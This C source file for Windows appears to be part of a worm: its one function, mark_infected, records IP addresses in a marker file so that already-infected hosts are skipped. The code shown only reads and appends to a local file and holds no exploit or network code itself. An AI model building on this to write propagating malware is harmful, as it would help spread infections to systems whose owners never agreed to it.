#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <windows.h>
#include <stddef.h>
#include <string.h>
#include "config.h"

int mark_infected(const char *ip)
{
    HANDLE file;
    size_t ip_length;
    size_t line_length = 0;
    BOOL line_matches = TRUE;
    BOOL line_present = FALSE;
    BOOL pending_cr = FALSE;
    BOOL found = FALSE;
    BOOL io_error = FALSE;
    unsigned char buffer[32768];
    DWORD bytes_read;

    if (ip == NULL)
        return -1;

    ip_length = strlen(ip);

    file = CreateFileA(SELF_MARKER,
                       GENERIC_READ | GENERIC_WRITE,
                       0,
                       NULL,
                       OPEN_ALWAYS,
                       FILE_ATTRIBUTE_NORMAL,
                       NULL);
    if (file == INVALID_HANDLE_VALUE)
        return -1;

    for (;;) {
        DWORD i;

        if (!ReadFile(file, buffer, (DWORD)sizeof(buffer), &bytes_read, NULL)) {
            io_error = TRUE;
            break;
        }
        if (bytes_read == 0)
            break;

        for (i = 0; i < bytes_read; ++i) {
            unsigned char ch = buffer[i];

            if (pending_cr) {
                if (ch == '\n') {
                    if (line_matches && line_length == ip_length) {
                        found = TRUE;
                        break;
                    }
                    line_length = 0;
                    line_matches = TRUE;
                    line_present = FALSE;
                    pending_cr = FALSE;
                    continue;
                }

                if (line_length >= ip_length ||
                    (unsigned char)ip[line_length] != '\r')
                    line_matches = FALSE;
                if (line_length == (size_t)-1) {
                    io_error = TRUE;
                    break;
                }
                ++line_length;
                pending_cr = FALSE;
            }

            if (ch == '\n') {
                if (line_matches && line_length == ip_length) {
                    found = TRUE;
                    break;
                }
                line_length = 0;
                line_matches = TRUE;
                line_present = FALSE;
                continue;
            }

            line_present = TRUE;
            if (ch == '\r') {
                pending_cr = TRUE;
                continue;
            }

            if (line_length >= ip_length ||
                (unsigned char)ip[line_length] != ch)
                line_matches = FALSE;
            if (line_length == (size_t)-1) {
                io_error = TRUE;
                break;
            }
            ++line_length;
        }

        if (found || io_error)
            break;
    }

    if (!io_error && !found) {
        if (pending_cr) {
            if (line_length >= ip_length ||
                (unsigned char)ip[line_length] != '\r')
                line_matches = FALSE;
            if (line_length == (size_t)-1) {
                io_error = TRUE;
            } else {
                ++line_length;
            }
        }

        if (!io_error && line_present &&
            line_matches && line_length == ip_length)
            found = TRUE;
    }

    if (io_error) {
        CloseHandle(file);
        return -1;
    }

    if (found) {
        if (!CloseHandle(file))
            return -1;
        return 1;
    }

    {
        LARGE_INTEGER end_position;
        size_t written = 0;
        static const char newline = '\n';

        end_position.QuadPart = 0;
        if (!SetFilePointerEx(file, end_position, NULL, FILE_END)) {
            CloseHandle(file);
            return -1;
        }

        while (written < ip_length) {
            size_t remaining = ip_length - written;
            DWORD chunk = remaining > (size_t)MAXDWORD
                              ? MAXDWORD
                              : (DWORD)remaining;
            DWORD bytes_written = 0;

            if (!WriteFile(file, ip + written, chunk, &bytes_written, NULL) ||
                bytes_written == 0) {
                CloseHandle(file);
                return -1;
            }
            written += bytes_written;
        }

        {
            DWORD bytes_written = 0;
            if (!WriteFile(file, &newline, 1, &bytes_written, NULL) ||
                bytes_written != 1) {
                CloseHandle(file);
                return -1;
            }
        }
    }

    if (!CloseHandle(file))
        return -1;

    return 0;
}